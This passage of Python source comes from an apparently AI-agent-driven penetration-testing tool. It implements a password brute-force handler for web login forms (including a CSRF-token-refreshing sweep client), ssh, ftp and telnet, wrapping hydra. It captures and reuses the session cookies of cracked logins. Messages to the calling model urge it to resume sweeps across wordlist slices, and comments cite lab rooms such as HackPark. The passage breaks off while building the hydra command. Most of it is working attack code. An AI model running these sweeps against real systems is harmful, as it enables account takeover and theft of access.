     budget, success_marker, progress_path, result_path) = sys.argv[1:13]
    budget = float(budget)
    per_request = min(10.0, budget)
    jar = {}
    if mode == "probe":
        known_bad = "invalid_probe_12345"
        baseline_status, baseline, _ = fetch(form_url, "GET", "", per_request, {}, True)
        status, text, _ = attempt(
            form_url, method, action_url, template, username, known_bad, per_request, {}
        )
        print(json.dumps({
            "ok": True,
            "baseline_status": baseline_status,
            "failure_status": status,
            "in_baseline": failure in baseline,
            "in_failure": failure in text,
            # The sweep needs fresh ``__VIEWSTATE``/CSRF values per attempt; the
            # probe is the one place that can say whether the page issues them.
            # Without this the handler could not tell "no tokens" from "the
            # client did not look" (V12, HackPark).
            "hidden_fields": [name for name, _ in hidden_fields(baseline)],
        }))
        return

    started = time.time()
    _PROGRESS["started"] = started
    deadline = started + budget
    with open(wordlist, encoding="utf-8", errors="replace") as handle:
        passwords = [line.rstrip("\r\n") for line in handle if line.strip()]
    total = len(passwords)
    tested = 0
    request_timeouts = 0
    consecutive_timeouts = 0
    last_error = ""
    for password in passwords:
        if time.time() >= deadline:
            payload = {
                "ok": True, "timed_out": True, "tested": tested, "total": total,
                "password": None, "request_timeouts": request_timeouts,
                "attempts_per_second": round(tested / max(0.001, time.time() - started), 3),
            }
            _write(result_path, payload)
            print(json.dumps(payload))
            return
        outcome = None
        last_exc = None
        for _retry in range(REQUEST_RETRIES + 1):
            try:
                outcome = attempt(
                    form_url, method, action_url, template, username, password, per_request, jar
                )
                break
            except (urllib.error.URLError, http.client.HTTPException, OSError) as exc:
                last_exc = exc
        if outcome is None:
            # R4: one slow or reset request is not the end of the sweep. Measured
            # in HackPark V12 (2026-10-21): a single ``URLError: timed out``
            # aborted the whole 5 000-password slice after 75 attempts (55 s) and
            # the run was told ``unavailable`` -the 4 925 remaining passwords,
            # including the room's own at offset 1 420, were never tried.
            request_timeouts += 1
            _PROGRESS["request_timeouts"] = request_timeouts
            consecutive_timeouts += 1
            last_error = type(last_exc).__name__ + ": " + str(last_exc)[:200]
            if consecutive_timeouts >= MAX_CONSECUTIVE_REQUEST_TIMEOUTS:
                payload = {
                    "ok": False, "tested": tested, "total": total,
                    "request_timeouts": request_timeouts,
                    "aborted": "consecutive_request_timeouts",
                    "error": last_error,
                    "attempts_per_second": round(tested / max(0.001, time.time() - started), 3),
                }
                _write(result_path, payload)
                print(json.dumps(payload))
                return
            continue
        status, text, hidden = outcome
        consecutive_timeouts = 0
        tested += 1
        _PROGRESS["tested"] = tested
        success = failure not in text
        if success and success_marker:
            success = success_marker in text
        if tested % 25 == 0:
            _write(progress_path, {
                "tested": tested, "total": total, "request_timeouts": request_timeouts,
                "elapsed_seconds": round(time.time() - started, 1),
            })
        if success:
            payload = {
                "ok": True, "timed_out": False, "tested": tested, "total": total,
                "password": password, "status": status,
                "request_timeouts": request_timeouts,
                "attempts_per_second": round(tested / max(0.001, time.time() - started), 3),
                "fields": [name for name, value in hidden],
                "set_cookie": ["%s=%s" % item for item in jar.items()],
            }
            _write(result_path, payload)
            print(json.dumps(payload))
            return
    payload = {
        "ok": True, "timed_out": False, "tested": tested, "total": total,
        "password": None, "request_timeouts": request_timeouts,
        "attempts_per_second": round(tested / max(0.001, time.time() - started), 3),
        "elapsed_seconds": round(time.time() - started, 1),
    }
    _write(result_path, payload)
    print(json.dumps(payload))

try:
    main()
except Exception as exc:
    # Never answer with a bare error: the caller needs ``tested`` to tell a slice
    # that proved nothing (``unavailable``) from one that did run and was cut
    # short (``partial``).
    print(json.dumps({
        "ok": False,
        "error": type(exc).__name__ + ": " + str(exc)[:200],
        "tested": _PROGRESS["tested"],
        "request_timeouts": _PROGRESS["request_timeouts"],
    }))
'''


@dataclass(frozen=True)
class _ProbeVerdict:
    """What the one-shot login taught us, and why it matters.

    ``status`` is ``ok`` (the needle discriminates), ``invalid`` (it does not, so
    a sweep with it proves nothing), ``skipped`` (the probe could not run) or
    ``disabled`` (the caller turned it off). A probe that cannot run never blocks
    a sweep: it is infrastructure, not a verdict about the target.
    """

    status: str
    reason: str = ""
    detail: dict[str, Any] = field(default_factory=dict)


def _probe_url(target: str, port: int, secure: bool, path: str) -> str:
    scheme = "https" if secure else "http"
    return f"{scheme}://{target}:{port}{path}"


def _probe_body(
    form_params: str, username: str, password: str = CRED_PROBE_PASSWORD
) -> str:
    """Fill hydra's placeholders with a real user and a password.

    The probe passes the known-bad one; the session capture below passes the
    password hydra just validated, through the exact template the sweep used.
    """
    return form_params.replace("^USER^", username).replace("^PASS^", password)


def _probe_verdict(payload: dict[str, Any]) -> _ProbeVerdict:
    """Turn the probe's two observations into the verdict the handler acts on."""
    detail = {key: payload.get(key) for key in (
        "baseline_status", "failure_status", "in_baseline", "in_failure",
    )}
    detail["hidden_fields"] = [str(name) for name in (payload.get("hidden_fields") or [])]
    if not payload.get("in_failure"):
        # Not in the response to a wrong credential: hydra would read every
        # attempt as a success and stop on the first one with a false positive.
        return _ProbeVerdict("invalid", "missing_in_failure_response", detail)
    if payload.get("in_baseline"):
        # Present before any credential was sent: the panel's own markup (the
        # button says "Login") carries it, so it cannot separate the branches.
        return _ProbeVerdict("invalid", "present_in_baseline", detail)
    return _ProbeVerdict("ok", "discriminating", detail)


async def _form_login_observation(
    *, target: str, port: int, secure: bool, path: str, form_params: str,
    failure_string: str, username: str, password: str, service: str,
    workspace_root: str,
) -> tuple[dict[str, Any] | None, str]:
    """One GET (anonymous) plus one form POST with ``password``.

    Returns the client's payload and, when there is none, the reason. Both the
    probe (known-bad password) and the session capture (validated password) go
    through here, so the two make the *same* request the sweep does: same body
    template, same method (``http-get-form`` puts the fields in the query), same
    sandbox and image as hydra.
    """
    from .http_request import _parse_last_json

    body = _probe_body(form_params, username or CRED_PROBE_USER_FALLBACK, password)
    baseline_url = _probe_url(target, port, secure, path)
    if service == "http-get-form":
        method, action_url, payload = "GET", f"{baseline_url}?{body}", ""
    else:
        method, action_url, payload = "POST", baseline_url, body
    sandbox = sandbox_for_environment(workspace_root, allowed_programs=CRED_ALLOWED_PROGRAMS)
    result = await run_in_sandbox(
        sandbox,
        ["python3", "-c", CRED_PROBE_SCRIPT, baseline_url, method, action_url,
         payload, failure_string, str(CRED_PROBE_TIMEOUT_SECONDS)],
        timeout_seconds=CRED_PROBE_TIMEOUT_SECONDS + 5,
        image_env="NEXUS_HTTP_IMAGE",
        default_image="python:3.12-alpine",
    )
    if not (result.stdout or "").strip():
        return None, "probe_did_not_run"
    try:
        payload_json = _parse_last_json(result.stdout or "")
    except ValueError:
        return None, "probe_returned_no_verdict"
    if not payload_json.get("ok"):
        return None, str(payload_json.get("error") or "probe_failed")[:200]
    return payload_json, ""


async def _probe_form_login(
    *, target: str, port: int, secure: bool, path: str, form_params: str,
    failure_string: str, username: str, service: str, workspace_root: str,
) -> _ProbeVerdict:
    """Make one known-bad login and say whether ``failure_string`` separates it.

    Runs in the same sandbox as hydra (so OCI mode keeps working) and fails open:
    a probe that cannot run is ``skipped``, never a reason to refuse the sweep.
    """
    payload_json, reason = await _form_login_observation(
        target=target, port=port, secure=secure, path=path,
        form_params=form_params, failure_string=failure_string,
        username=username, password=CRED_PROBE_PASSWORD, service=service,
        workspace_root=workspace_root,
    )
    if payload_json is None:
        return _ProbeVerdict("skipped", reason)
    return _probe_verdict(payload_json)


def _cookie_header(set_cookie: list[Any]) -> str:
    """``"a=1; b=2"`` from raw ``Set-Cookie`` values (attributes dropped)."""
    pairs = []
    for raw in set_cookie or ():
        first = str(raw).split(";", 1)[0].strip()
        if "=" in first and first not in pairs:
            pairs.append(first)
    return "; ".join(pairs)


def _cookie_names(set_cookie: list[Any]) -> list[str]:
    """Names of the cookies set by a response (never the values)."""
    names = []
    for raw in set_cookie or ():
        first = str(raw).split(";", 1)[0].strip()
        name = first.split("=", 1)[0].strip()
        if name and name not in names:
            names.append(name)
    return names


async def _capture_form_session(
    *, target: str, port: int, secure: bool, path: str, form_params: str,
    failure_string: str, username: str, password: str, service: str,
    workspace_root: str, tenant_id: str,
) -> dict[str, Any]:
    """Log in once with the winning credential and keep the session it opens.

    Hydra proves the *password*; a panel answers with a cookie, and without that
    cookie the credential cannot be used from any other tool (Brute It v7,
    iteration 20: ``admin`` validated, ``vault:443a…`` on the board, and every
    later attempt answered 401/redirect because nothing carried the session).

    The ``Cookie`` header is stored in the vault -it is a bearer secret- and only
    its handle travels: ``session_ref`` is what ``nexus.web.request`` accepts.
    The failure marker of the same login is checked again, so a session is never
    claimed for a login the panel rejected.
    """
    payload, reason = await _form_login_observation(
        target=target, port=port, secure=secure, path=path,
        form_params=form_params, failure_string=failure_string,
        username=username, password=password, service=service,
        workspace_root=workspace_root,
    )
    if payload is None:
        return {"verified": False, "reason": reason}
    if payload.get("in_failure"):
        return {
            "verified": False,
            "reason": "failure_marker_still_present",
            "status": payload.get("failure_status"),
        }
    raw_cookies = [str(value) for value in payload.get("set_cookie") or ()]
    header = _cookie_header(raw_cookies)
    names = _cookie_names(raw_cookies)
    if not header:
        # A login without a cookie is still a valid login (HTTP basic, a token in
        # the body): say so instead of inventing a session.
        return {
            "verified": True,
            "reason": "no_set_cookie",
            "cookies": [],
            "status": payload.get("failure_status"),
        }
    ref = default_secret_store().put(
        header.encode("utf-8"), kind="session", tenant_id=tenant_id
    )
    return {
        "verified": True,
        "session_ref": ref,
        "cookies": names,
        "status": payload.get("failure_status"),
        "usage": (
            "nexus.web.request con session_ref=<handle> reutiliza esta sesión; "
            "no hace falta la contraseña."
        ),
    }


def _csrf_form_target(
    value: Any, *, target: str, port: int, secure: bool, form_path: str
) -> str:
    """Return the absolute URL whose form issues the tokens.

    A bare path is resolved against the scope-gated ``target``/port, exactly like
    ``form_url``; a full URL is kept (including its query, which often carries
    the ``ReturnURL`` the panel needs to render the form).
    """
    text = str(value or "").strip()
    if not text:
        return _probe_url(target, port, secure, form_path)
    if "://" not in text:
        return _probe_url(target, port, secure, text if text.startswith("/") else "/" + text)
    parts = urlsplit(text)
    if parts.scheme not in _FORM_URL_SCHEMES or not parts.hostname:
        raise ToolInputError("csrf_form_url must be an http/https URL or a path")
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in text):
        raise ToolInputError("csrf_form_url contains control characters")
    return text


async def _csrf_form_observation(
    mode: str,
    *,
    page_url: str,
    action_url: str,
    service: str,
    form_params: str,
    failure_string: str,
    username: str,
    wordlist_path: str,
    budget_seconds: float,
    workspace_root: str,
    progress_path: str = "",
    result_path: str = "",
) -> tuple[dict[str, Any] | None, str]:
    """Run one phase of the token-aware form client inside the sandbox."""
    from .http_request import _parse_last_json

    method = "GET" if service == "http-get-form" else "POST"
    sandbox = sandbox_for_environment(workspace_root, allowed_programs=CRED_ALLOWED_PROGRAMS)
    result = await run_in_sandbox(
        sandbox,
        [
            "python3", "-c", CRED_CSRF_SCRIPT, mode, page_url, method, action_url,
            form_params, failure_string, username, wordlist_path, str(budget_seconds),
            "", progress_path, result_path,
        ],
        timeout_seconds=budget_seconds + 5,
        image_env="NEXUS_HTTP_IMAGE",
        default_image="python:3.12-alpine",
    )
    stdout = (result.stdout or "").strip()
    payload: dict[str, Any] | None = None
    if stdout:
        try:
            payload = _parse_last_json(stdout)
        except ValueError:
            payload = None
    if payload is None and result_path and os.path.isfile(result_path):
        try:
            with open(result_path, encoding="utf-8", errors="replace") as handle:
                payload = _parse_last_json(handle.read(1_000_000))
        except (OSError, ValueError):
            payload = None
    if payload is None:
        return None, "csrf_client_did_not_answer"
    if not payload.get("ok"):
        # R4: an aborted client is only ``unavailable`` when it tested nothing.
        # A payload with ``tested > 0`` is a slice that ran and was cut short,
        # and the caller decides between ``partial`` and ``unavailable``.
        return payload, str(payload.get("error") or "csrf_client_failed")[:200]
    return payload, ""


async def _probe_csrf_form_login(
    *, page_url: str, action_url: str, service: str, form_params: str,
    failure_string: str, username: str, workspace_root: str,
) -> _ProbeVerdict:
    """Validate the failure marker through the token flow.

    The non-CSRF probe would POST without the tokens and read the panel's
    "invalid token" page as the failure branch, which says nothing about the
    credential marker. This one asks the same question the sweep will ask.
    """
    payload, reason = await _csrf_form_observation(
        "probe",
        page_url=page_url,
        action_url=action_url,
        service=service,
        form_params=form_params,
        failure_string=failure_string,
        username=username,
        wordlist_path="",
        budget_seconds=CRED_PROBE_TIMEOUT_SECONDS,
        workspace_root=workspace_root,
    )
    # A probe that could not run is ``skipped`` (it never blocks the sweep); only
    # a real answer says anything about the marker. ``ok=false`` is an
    # infrastructure failure, not a verdict about the login page.
    if payload is None or not payload.get("ok"):
        return _ProbeVerdict("skipped", reason)
    return _probe_verdict(payload)


async def _csrf_form_sweep(
    *,
    context: RunContext,
    target: str,
    service: str,
    port: int,
    page_url: str,
    action_url: str,
    form_path: str,
    form_params: str,
    failure_string: str,
    username: str,
    wordlist_path: str,
    attempts: int,
    exhausted: bool,
    start_at: int,
    timeout_seconds: int,
    workspace_root: str,
    run_dir: str,
    probe: _ProbeVerdict,
    csrf_auto: bool = False,
) -> ToolResult:
    """Sweep a token-protected form with the embedded client (no hydra)."""
    progress_path = os.path.join(run_dir, "csrf_progress.json")
    result_path = os.path.join(run_dir, "csrf_result.json")
    budget_seconds = max(10, timeout_seconds - 5)
    payload, reason = await _csrf_form_observation(
        "sweep",
        page_url=page_url,
        action_url=action_url,
        service=service,
        form_params=form_params,
        failure_string=failure_string,
        username=username,
        wordlist_path=wordlist_path,
        budget_seconds=budget_seconds,
        workspace_root=workspace_root,
        progress_path=progress_path,
        result_path=result_path,
    )
    evidence: dict[str, Any] = {
        "service": service,
        "port": port,
        "username": username,
        "attempts": attempts,
        "start_at": start_at,
        "engine": "csrf-form-sweep",
        "timeout_seconds": timeout_seconds,
        "noise_level": "medium",
        "form_url": form_path,
        "failure_string_probe": probe.status,
        "csrf_mode": True,
        "csrf_auto": csrf_auto,
    }
    if probe.reason:
        evidence["failure_string_probe_reason"] = probe.reason

    tested = int((payload or {}).get("tested") or 0)
    request_timeouts = int((payload or {}).get("request_timeouts") or 0)
    attempts_per_second = float((payload or {}).get("attempts_per_second") or 0.0)
    evidence.update({
        "tested": tested,
        "request_timeouts": request_timeouts,
        "attempts_per_second": attempts_per_second,
    })
    if payload is None or (not payload.get("ok") and tested <= 0):
        # Only a client that never tested anything is ``unavailable``: the
        # backend did not serve the call, and the loop must not read it as a
        # verdict about the target (R4).
        return ToolResult(
            output={
                "error": "the CSRF form client did not answer",
                "reason": reason,
                "target": target,
                "service": service,
                "port": port,
                "tested": tested,
                "request_timeouts": request_timeouts,
            },
            verified=False,
            outcome="unavailable",
            verification_method="cred_bruteforce_csrf_failed",
            evidence=evidence,
        )
    if not payload.get("ok"):
        # The slice ran and was cut short (the client hit its per-request
        # failure cap or raised): nothing was proven, but the passwords it did
        # try are spent. ``partial`` + ``next_start_at`` lets the model resume
        # instead of concluding "brute force does not work here" (HackPark V12:
        # one URLError at 75/5 000 became ``unavailable``).
        next_start_at = start_at + tested
        return ToolResult(
            output={
                "error": "the CSRF form client aborted mid-slice",
                "reason": reason,
                "aborted": str(payload.get("aborted") or "client_error"),
                "tested": tested,
                "request_timeouts": request_timeouts,
                "attempts_per_second": attempts_per_second,
                "next_start_at": next_start_at,
                "message": (
                    f"El barrido con CSRF se cortó tras {tested} intentos "
                    f"({request_timeouts} fallos de red) sin credencial válida. "
                    "NO es un veredicto sobre el objetivo ni sobre la contraseña: "
                    f"repite con start_at={next_start_at} para el siguiente slice."
                ),
                "target": target,
                "service": service,
                "port": port,
                "attempts": attempts,
            },
            verified=False,
            outcome="partial",
            verification_method="cred_bruteforce_csrf_aborted",
            evidence=evidence,
            stdout=payload.get("error"),
        )

    timed_out = bool(payload.get("timed_out"))
    password = str(payload.get("password") or "")
    fields = [str(name) for name in (payload.get("fields") or [])]
    evidence.update({
        "next_start_at": start_at + tested,
        "wordlist_completed": (exhausted and not timed_out and tested >= attempts),
        "found_count": 1 if password else 0,
        "csrf_fields": fields,
    })

    if timed_out and not password:
        return ToolResult(
            output={
                "error": "credential testing timed out",
                "aborted": "time_cap",
                "message": (
                    f"El barrido de formulario con CSRF se cortó a los "
                    f"{timeout_seconds}s sin credencial válida ({tested} intentos). "
                    "No es un veredicto sobre el objetivo: sube timeout_seconds, "
                    "baja max_attempts (el barrido va por slices con start_at) o "
                    "cambia de vector."
                ),
                "target": target,
                "service": service,
                "port": port,
                "attempts": attempts,
                "tested": tested,
                "request_timeouts": request_timeouts,
                "attempts_per_second": attempts_per_second,
                "next_start_at": start_at + tested,
            },
            verified=False,
            outcome="timeout",
            verification_method="cred_bruteforce_csrf_timeout",
            evidence=evidence,
            stdout=payload.get("error"),
            timed_out=True,
        )

    raw_credentials = (
        [{"username": username, "password": password, "service": service}]
        if password else []
    )
    stored = store_discovered_credentials(raw_credentials, tenant_id=context.tenant_id)
    evidence["secret_refs"] = [
        entry["secret_ref"] for entry in stored if entry.get("secret_ref")
    ]
    session: dict[str, Any] | None = None
    if stored:
        raw_cookies = [str(value) for value in payload.get("set_cookie") or ()]
        header = _cookie_header(raw_cookies)
        names = _cookie_names(raw_cookies)
        if header:
            ref = default_secret_store().put(
                header.encode("utf-8"), kind="session", tenant_id=context.tenant_id
            )
            session = {
                "verified": True,
                "session_ref": ref,
                "cookies": names,
                "status": payload.get("status"),
                "usage": (
                    "nexus.web.request con session_ref=<handle> reutiliza esta "
                    "sesión; no hace falta la contraseña."
                ),
            }
        else:
            session = {
                "verified": True,
                "reason": "no_set_cookie",
                "cookies": [],
                "status": payload.get("status"),
            }

    # A slice is only a *verdict* when every entry in it was really tested. A
    # lost entry (request cut twice) leaves ``tested < attempts``: the sweep is
    # then ``partial`` and resumable, never a `negative` that closes the branch.
    completed_slice = bool(exhausted and tested >= attempts)
    partial = not stored and not timed_out and not completed_slice
    negative = not stored and not timed_out and completed_slice
    if negative:
        _record_brute_barrier(
            context,
            target=target,
            port=port,
            reason=(
                f"fuerza bruta {service} (csrf) sobre {target}:{port} sin "
                f"credencial válida tras {tested} intentos ({timeout_seconds}s)"
            ),
            detail={"service": service, "attempts": tested, "csrf_mode": True},
        )

    output: dict[str, Any] = {
        "target": target,
        "service": service,
        "port": port,
        "username": username,
        "attempts": attempts,
        "tested": tested,
        "start_at": start_at,
        "next_start_at": start_at + tested,
        "wordlist_completed": (exhausted and not timed_out and tested >= attempts),
        "valid_credentials": stored,
        "engine": "csrf-form-sweep",
        "csrf_fields": fields,
    }
    if session is not None:
        output["session"] = session
    if negative:
        output["message"] = (
            "El barrido con CSRF completó la wordlist sin credenciales válidas"
        )
    elif partial:
        output["message"] = (
            f"Slice sin acierto: {tested} entradas desde el offset {start_at} y la "
            "wordlist tiene más. Repite con "
            f"start_at={start_at + tested} para el siguiente slice."
        )
    return ToolResult(
        output=output,
        verified=bool(stored),
        outcome="" if stored else ("partial" if partial else ("negative" if negative else "")),
        verification_method="cred_bruteforce_csrf_completed",
        evidence=evidence,
        stdout=_scrub_plaintext(payload.get("error") or "", raw_credentials),
    )


def _invalid_failure_string_result(
    *, target: str, service: str, port: int, form_path: str,
    failure_string: str, probe: _ProbeVerdict,
) -> ToolResult:
    """Answer ``invalid_failure_string``: the marker cannot report a hit.

    This is a determinate result about the *argument*, not about the target, and
    it costs two requests instead of a full sweep: hydra would have run the whole
    wordlist and, with a marker present in both branches, could never have
    reported the credential it walked past (Brute It v6, iteration 8: 600 s and
    zero information).
    """
    if probe.reason == "present_in_baseline":
        why = (
            "el texto indicado aparece ya en la propia página de login, sin "
            "enviar credenciales (por ejemplo el botón dice 'Login'), así que no "
            "distingue un login fallido de uno correcto"
        )
    else:
        why = (
            "el texto indicado no aparece en la respuesta a una credencial "
            "incorrecta, así que Hydra leería cualquier intento como acierto"
        )
    message = (
        f"failure_string no discrimina el login de {form_path}: {why}. NO se "
        "lanzó el barrido (no se ha gastado presupuesto). Solución: inspecciona "
        "el HTML con nexus.web.request (GET a la página y POST con "
        "user=<usuario>&pass=<cualquiera>) y copia el texto que aparece SOLO "
        "cuando la credencial falla; después repite la llamada con ese "
        "failure_string. Pasa probe=false para saltar esta comprobación."
    )
    return ToolResult(
        output={
            "error": "failure_string does not identify a failed login",
            "reason": probe.reason,
            "message": message,
            "failure_string": failure_string,
            "form_url": form_path,
            "probe": probe.detail,
            "target": target,
            "service": service,
            "port": port,
            "sweep_attempted": False,
        },
        verified=False,
        outcome="invalid_failure_string",
        verification_method="cred_bruteforce_failure_string_invalid",
        evidence={
            "service": service,
            "port": port,
            "form_url": form_path,
            "failure_string": failure_string,
            "failure_string_probe": probe.status,
            "failure_string_probe_reason": probe.reason,
            "probe": probe.detail,
            "attempts": 0,
        },
    )


def _record_brute_barrier(
    context: RunContext,
    *,
    target: str,
    port: int,
    reason: str,
    detail: dict[str, Any] | None = None,
) -> bool:
    """Write the ``barrier`` that closes a brute-forced branch (never raises).

    Only a sweep that *finished its wordlist* without a hit calls this: that is a
    deterministic verdict about the target, and recording it keeps the next turn
    from repeating the sweep -the exact reflex that burned three turns and four
    minutes in ``/tmp/bruteit-run-v2.ndjson``. A sweep cut by the budget does not
    close anything: it proved nothing. The fact is unverified and its ``source``
    names the tool, so it never reads as proof of anything.
    """
    store = getattr(context, "store", None)
    engagement_id = str(getattr(context, "engagement_id", "") or "")
    if store is None or not engagement_id:
        return False
    from nexus_core.kernel.blackboard import Blackboard

    try:
        Blackboard(store).record(
            tenant_id=getattr(context, "tenant_id", "system"),
            engagement_id=engagement_id,
            fact_type="barrier",
            key=f"{target}:{port}",
            # R6: this barrier carries the provenance the ledger needs to close
            # the branch -the sweep really ran to the end of the wordlist.
            value={
                "reason": reason,
                "sweep_attempted": True,
                "outcome": "negative",
                **(detail or {}),
            },
            source="nexus.cred.bruteforce",
            created_by="nexus.cred.bruteforce",
            verified=False,
        )
    except Exception:  # noqa: BLE001 - memory must never break a tool
        return False
    return True


async def cred_bruteforce_handler(arguments: dict[str, Any], context: RunContext) -> ToolResult:
    """Test a username/wordlist against a service through the sandbox."""
    from nexus_core.kernel.schema_validation import validate

    validate(arguments, cred_bruteforce_definition().input_schema)
    target = _validate_text(arguments.get("target"), "target", max_length=255)
    service = str(arguments.get("service") or "").strip().lower()
    if service not in CRED_SERVICES:
        raise ToolInputError(f"unsupported service: {service!r}")
    username = (
        _validate_text(arguments.get("username"), "username", max_length=128)
        if service in {"ssh", "ftp", *CRED_FORM_SERVICES} or arguments.get("username")
        else ""
    )
    password_file = _validate_text(
        arguments.get("password_file"), "password_file", max_length=1024
    )
    form_path = form_host = ""
    form_port: int | None = None
    secure = False
    form_spec = ""
    failure_string = ""
    form_params = ""
    raw_form_url = ""
    form_query_dropped = ""
    form_params_autofill = ""
    if service in CRED_FORM_SERVICES:
        raw_form_url = str(arguments.get("form_url") or "")
        form_path, form_host, form_port, secure = _normalize_form_url(raw_form_url)
        # The query is dropped by ``_normalize_form_url`` (hydra cannot carry it and
        # the login does not need it); it is reported so the run can see that the
        # route it reads is the one that ran.
        form_query_dropped = urlsplit(raw_form_url.strip()).query
        form_params, form_params_autofill = _ensure_password_placeholder(
            str(arguments.get("form_params") or "")
        )
        failure_string = str(arguments.get("failure_string") or "").strip()
        form_spec = _form_spec(form_path, form_params, failure_string)

    # ``csrf_mode`` is only meaningful for a form: it replaces hydra with the
    # token-aware client. A flag on ssh/ftp would be a silent no-op, so it is
    # rejected instead of ignored.
    csrf_mode = bool(arguments.get("csrf_mode", False))
    csrf_form_raw = str(arguments.get("csrf_form_url") or "").strip()
    if csrf_mode and service not in CRED_FORM_SERVICES:
        raise ToolInputError("csrf_mode requires service=http-post-form or http-get-form")
    if csrf_form_raw and not csrf_mode:
        raise ToolInputError("csrf_form_url requires csrf_mode=true")

    # ``form_url`` may repeat the host and the port the call already carries. hydra
    # always connects to ``target`` -the scope-gated field-, so a URL naming another
    # host is a modelling slip, not a second objective: its route is still used,
    # its port and TLS are not.
    same_host = not form_host or _host_key(form_host) == _host_key(target)
    requested_port = arguments.get("port")
    if requested_port:
        port = int(requested_port)
    elif same_host and form_port:
        port = form_port
    elif same_host and secure:
        # ``https://`` without an explicit port is 443, not 80.
        port = 443
    else:
        port = CRED_DEFAULT_PORTS.get(service, 0)
    if not 1 <= port <= 65535:
        raise ToolInputError("port out of range")
    secure = (secure and same_host) or port in CRED_SSL_PORTS
    csrf_page_url = ""
    form_action_url = ""
    if csrf_mode:
        form_action_url = _probe_url(target, port, secure, form_path)
        csrf_page_url = _csrf_form_target(
            csrf_form_raw, target=target, port=port, secure=secure, form_path=form_path
        )
    # No cap of the handler's own: ``max_attempts`` cuts the list only when the
    # caller asks for it, and ``timeout_seconds`` is the caller's or the budget the
    # tool's contract publishes. The TCP script keeps its own (smaller) budget
    # because it is a python probe, not a hydra sweep.
    requested_attempts = arguments.get("max_attempts")
    max_attempts = (
        int(requested_attempts) if requested_attempts else CRED_DEFAULT_MAX_ATTEMPTS
    )
    start_at = int(arguments.get("start_at") or 0)
    if start_at < 0:
        raise ToolInputError("start_at must be zero or positive")
    requested_timeout = arguments.get("timeout_seconds")
    default_timeout = (
        CRED_DEFAULT_TIMEOUT_SECONDS
        if service in {"tcp", "telnet"}
        else CRED_SWEEP_TIMEOUT_SECONDS
    )
    timeout_seconds = int(requested_timeout) if requested_timeout else default_timeout

    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    # The probe goes first: two requests either prove the failure marker
    # discriminates or stop a sweep that could not have found anything. It runs
    # before the wordlist is copied, so a bad marker costs 2 requests, not the
    # copy of a 14M-line dictionary.
    probe = _ProbeVerdict("disabled", "not_a_form_service")
    csrf_auto = False
    if form_spec and bool(arguments.get("probe", True)):
        if csrf_mode:
            probe = await _probe_csrf_form_login(
                page_url=csrf_page_url, action_url=form_action_url, service=service,
                form_params=form_params, failure_string=failure_string,
                username=username, workspace_root=workspace_root,
            )
        else:
            probe = await _probe_form_login(
                target=target, port=port, secure=secure, path=form_path,
                form_params=form_params, failure_string=failure_string,
                username=username, service=service, workspace_root=workspace_root,
            )
    # The page already told us it needs tokens: switch to the token-aware sweep
    # instead of letting Hydra burn the wordlist on requests the panel rejects
    # before it even reads the password (run V10, iteration 12).
    if (
        not csrf_mode
        and form_spec
        and probe.status != "disabled"
        and any(
            CRED_CSRF_FIELD_RE.search(str(name))
            for name in probe.detail.get("hidden_fields") or []
        )
    ):
        csrf_mode = True
        csrf_auto = True
        form_action_url = _probe_url(target, port, secure, form_path)
        csrf_page_url = _csrf_form_target(
            "", target=target, port=port, secure=secure, form_path=form_path
        )
        probe = await _probe_csrf_form_login(
            page_url=csrf_page_url, action_url=form_action_url, service=service,
            form_params=form_params, failure_string=failure_string,
            username=username, workspace_root=workspace_root,
        )
    if probe.status == "invalid":
        return _invalid_failure_string_result(
            target=target, service=service, port=port, form_path=form_path,
            failure_string=failure_string, probe=probe,
        )

    source_path = _resolve_wordlist(workspace_root, password_file)
    run_dir = tempfile.mkdtemp(prefix=f"cred_{safe_run_id(context)}_", dir=workspace_root)
    wordlist_path = os.path.join(run_dir, "wordlist.txt")
    outfile_path = os.path.join(run_dir, "hydra.txt")
    attempts, exhausted = _truncate_wordlist(
        source_path, wordlist_path, max_attempts, start_at
    )
    if attempts == 0:
        raise ToolInputError(
            f"password_file has no usable entries at offset {start_at}"
            if start_at
            else "password_file has no usable entries"
        )

    if csrf_mode:
        return await _csrf_form_sweep(
            context=context,
            target=target,
            service=service,
            port=port,
            page_url=csrf_page_url,
            action_url=form_action_url,
            form_path=form_path,
            form_params=form_params,
            failure_string=failure_string,
            username=username,
            wordlist_path=wordlist_path,
            attempts=attempts,
            exhausted=exhausted,
            start_at=start_at,
            timeout_seconds=timeout_seconds,
            workspace_root=workspace_root,
            run_dir=run_dir,
            probe=probe,
            csrf_auto=csrf_auto,
        )

    if service in {"tcp", "telnet"}:
        from ._tcp_credentials import TCP_CREDENTIAL_SCRIPT
        from .http_request import _parse_last_json
        if not 1 <= port <= 65535:
            raise ToolInputError("TCP requires an explicit valid port")
        success = _validate_text(arguments.get("success_marker"), "success_marker", max_length=128)
        password_prompt = _validate_text(arguments.get("password_prompt", "Password:"), "password_prompt", max_length=128)
        login_prompt = str(arguments.get("login_prompt") or "")
        if login_prompt and not username:
            raise ToolInputError("login_prompt requires username")
        sandbox = sandbox_for_environment(workspace_root, allowed_programs=CRED_ALLOWED_PROGRAMS)
        result = await run_in_sandbox(
            sandbox, ["python3", "-c", TCP_CREDENTIAL_SCRIPT, target, str(port), username,
                      wordlist_path, password_prompt, success, login_prompt,
                      "1" if service == "telnet" else "0"],
            timeout_seconds=timeout_seconds, image_env="NEXUS_HTTP_IMAGE",
            default_image="python:3.12-alpine",
        )
        payload = _parse_last_json(result.stdout) if result.stdout else {}
        stored = store_discovered_credentials(
            payload.get("valid_credentials") or [], tenant_id=context.tenant_id
        )
        output = {key: value for key, value in payload.items() if key != "valid_credentials"}
        output.update({"target": target, "service": service, "port": port,
                       "valid_credentials": stored})
        return ToolResult(
            output=output,
            verified=(result.exit_code == 0 and not result.timed_out and bool(payload)
                      and (bool(payload.get("valid_credentials")) or payload.get("errors") == 0)),
            exit_code=result.exit_code, timed_out=result.timed_out,
            verification_method="tcp_positive_marker",
            evidence={"max_attempts": max_attempts,
                      "secret_refs": [entry["secret_ref"] for entry in stored
                                      if entry.get("secret_ref")]},
            stdout=_scrub_plaintext(result.stdout or "", payload.get("valid_credentials") or []),
            stderr=_scrub_plaintext(result.stderr or "", payload.get("valid_credentials") or []),
        )

    # ``service://host`` is the *direct* module spelling (ssh/ftp/telnet); the
    # two form modules take ``host module "spec"``. ``-S`` is hydra's SSL
    # switch: without it a 443 login is tested in cleartext and every attempt
    # "fails", which reads as a negative verdict instead of a bug.
    argv = [
        "hydra",
        "-l",
        username,
        "-P",
